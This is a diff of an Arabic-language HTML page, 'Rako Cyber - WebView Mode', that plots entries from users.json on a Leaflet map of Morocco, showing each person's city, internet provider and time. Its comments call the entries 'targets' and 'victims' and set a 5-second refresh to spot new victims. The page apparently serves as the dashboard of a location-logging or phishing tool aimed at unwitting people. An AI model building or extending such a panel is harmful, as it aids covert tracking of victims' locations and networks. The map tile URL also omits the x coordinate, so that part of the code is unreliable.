@@ -2,28 +2,59 @@
 <html lang="ar">
 <head>
 <meta charset="UTF-8">
-<title> Rako Cyber - WebView </title>
+<title> Rako Cyber - WebView Mode </title>
+
 <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+
 <style>
-body { margin: 0; background: #f0f2f5; }
+body { margin: 0; font-family: 'Segoe UI', sans-serif; background: #f0f2f5; }
 #map { height: 100vh; }
+.popup-box { font-size: 14px; line-height: 1.4; }
+.popup-box b { color: #007bff; }
 </style>
 </head>
 <body>
-<div id="map"></div>
-<script>
-const map = L.map("map").setView([31.7917, -7.0926], 6);
-L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{y}.png").addTo(map);
 
-fetch("users.json")
-  .then(r => r.json())
-  .then(users => {
-    users.forEach(u => {
-      L.marker([u.lat, u.lon]).addTo(map)
-        .bindPopup(`<b>📍 المدينة:</b> ${u.city || "غير معروفة"}<br><b>⏰ الوقت:</b> ${u.time}`);
-    });
-  });
+<div id="map"></div>
+
+<script>
+// إعداد الخريطة على إحداثيات المغرب (MA)
+const map = L.map("map").setView([31.7917, -7.0926], 6);
+
+L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{y}.png", {
+  attribution: "© OpenStreetMap"
+}).addTo(map);
+
+const userIcon = L.icon({
+  iconUrl: "https://cdn-icons-png.flaticon.com/512/1077/1077114.png",
+  iconSize: [32, 32],
+  iconAnchor: [16, 32]
+});
+
+// وظيفة جلب البيانات وعرضها
+function loadTargets() {
+    fetch("users.json")
+      .then(r => r.json())
+      .then(users => {
+        users.forEach(u => {
+          L.marker([u.lat, u.lon], { icon: userIcon })
+            .addTo(map)
+            .bindPopup(`
+              <div class="popup-box">
+                <b>📍 المدينة:</b> ${u.City || "غير معروفة"}<br>
+                <b>🌐 المزود:</b> ${u.org}<br>
+                <div class="time">⏰ ${u.time}</div>
+              </div>
+            `);
+        });
+      }).catch(e => console.log("Waiting for data..."));
+}
+
+// تحديث الخريطة كل 5 ثوانٍ لرؤية الضحايا الجدد فوراً
+setInterval(loadTargets, 5000);
+loadTargets();
 </script>
+
 </body>
 </html>
